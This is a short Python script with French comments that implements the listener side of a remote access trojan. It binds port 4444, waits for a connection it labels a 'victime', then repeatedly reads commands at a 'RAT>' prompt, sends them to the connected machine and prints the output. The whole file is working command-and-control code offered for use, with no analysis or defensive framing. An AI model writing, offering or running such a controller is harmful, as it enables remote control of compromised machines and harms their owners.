import socket
import os

IP = "0.0.0.0"  # écoute sur toutes les interfaces
PORT = 4444

server = socket.socket()
server.bind((IP, PORT))
server.listen(1)

print(f"[+] En attente de connexion sur {IP}:{PORT} ...")
client, addr = server.accept()
print(f"[+] Victime connectée depuis {addr}")

while True:
    cmd = input("RAT> ")
    if cmd.lower() in ["exit", "quit"]:
        client.send(b"exit")
        client.close()
        break
    client.send(cmd.encode())
    result = client.recv(4096).decode()
    print(result)
